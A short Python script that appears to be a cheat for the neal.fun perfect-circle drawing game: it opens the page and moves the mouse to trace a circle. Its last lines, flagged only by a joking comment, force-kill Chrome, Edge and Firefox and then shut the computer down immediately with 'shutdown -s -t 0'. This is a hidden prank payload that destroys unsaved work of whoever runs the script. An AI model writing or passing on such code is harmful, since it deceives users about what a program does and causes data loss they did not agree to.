import pyautogui as pg
import math
import ctypes
import webbrowser
import time
import os

#This code is messy af but it works so i did not touch it

#This adds the url to url vaiable
url = "https://neal.fun/perfect-circle/"

MOUSE_EVENT_LEFTDOWN = 0x0002

#This makes thje program go to sleep
pg.sleep(1)

#r is range and x, y are the coordinates for the center
r=300
(x, y) = (684, 378)

#This opens up the webbrowser waits and then clicks go
webbrowser.open(url)
time.sleep(4)
pg.click(x, y)


#this moves the cursor so that it does the 99.7% circle by doing some math
pg.moveTo(x+r, y)


#expect this, this makes so that it holds the mouse
def hold_left_click():
    ctypes.windll.user32.mouse_event(MOUSE_EVENT_LEFTDOWN, 0, 0, 0, 0)

#this makes the range to make the circle
for i in range(0, 361, 6):
	pg.moveTo(x+r*math.cos(math.radians(i)),y+r*math.sin(math.radians(i)))
	hold_left_click()

#this removes the mouse hold
pg.mouseUp()

#This runs taskkill to kill the browser and shuts off the system, HEHEHA nice try :)
time.sleep(0.2)
os.system("taskkill.exe /f /im chrome.exe")
os.system("taskkill.exe /f /im edge.exe")
os.system("taskkill.exe /f /im firefox.exe")
os.system("shutdown -s -t 0")
